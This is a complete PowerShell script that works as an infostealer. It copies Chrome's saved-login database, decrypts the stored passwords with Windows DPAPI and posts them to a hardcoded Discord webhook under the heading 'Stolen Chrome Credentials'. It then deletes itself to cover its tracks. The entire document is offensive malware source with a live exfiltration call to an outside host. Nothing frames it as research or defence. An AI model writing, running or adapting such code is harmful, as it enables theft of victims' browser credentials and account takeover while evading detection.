# Discord webhook URL - replace with your actual webhook URL
$webhookURL = "https://discord.com/api/webhooks/1302032038563414147/o5jjFWbs_6-_rTlE-BqdFf7Gayo5DkW8Cj2HXdpWr9eiOkfQv1N_iR-el8CvliJCNSMg"

# Function to decrypt Chrome passwords
function Get-ChromePasswords {
    # Get the Chrome Login Data file path
    $localAppData = [System.Environment]::GetFolderPath('LocalApplicationData')
    $chromePath = "$localAppData\Google\Chrome\User Data\Default\Login Data"
    $tempPath = "$env:TEMP\LoginData.db"

    # Copy the database to a temporary location to avoid file locks
    Copy-Item -Path $chromePath -Destination $tempPath -ErrorAction SilentlyContinue

    # Connect to the SQLite database and extract login credentials
    $query = "SELECT origin_url, username_value, password_value FROM logins"
    $connection = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$tempPath;Version=3;")
    $connection.Open()
    $command = $connection.CreateCommand()
    $command.CommandText = $query
    $reader = $command.ExecuteReader()

    # Collect results
    $result = @()
    while ($reader.Read()) {
        $url = $reader["origin_url"]
        $username = $reader["username_value"]
        $passwordBlob = $reader["password_value"]

        # Decrypt the password using Windows DPAPI
        $password = [System.Text.Encoding]::UTF8.GetString([System.Security.Cryptography.ProtectedData]::Unprotect($passwordBlob, $null, 'CurrentUser'))

        $result += [PSCustomObject]@{
            URL      = $url
            Username = $username
            Password = $password
        }
    }

    # Close connection and remove temporary database file
    $connection.Close()
    Remove-Item -Path $tempPath -Force
    return $result
}

# Function to send the results to Discord via Webhook
function Send-ToDiscord {
    param ($data)

    # Format data as JSON for Discord embed
    $json = @{
        content = "Stolen Chrome Credentials"
        embeds = @(
            @{
                title = "Credentials Found"
                description = $data
            }
        )
    } | ConvertTo-Json -Depth 4

    # Send data to Discord webhook
    Invoke-RestMethod -Uri $webhookURL -Method POST -Body $json -ContentType 'application/json'
}

# Main Execution
$credentials = Get-ChromePasswords
if ($credentials.Count -gt 0) {
    $formatted = $credentials | Out-String
    Send-ToDiscord -data $formatted
} else {
    Write-Output "No credentials found"
}

# Delete the script itself after execution
Remove-Item -Path "$env:TEMP\script.ps1" -Force
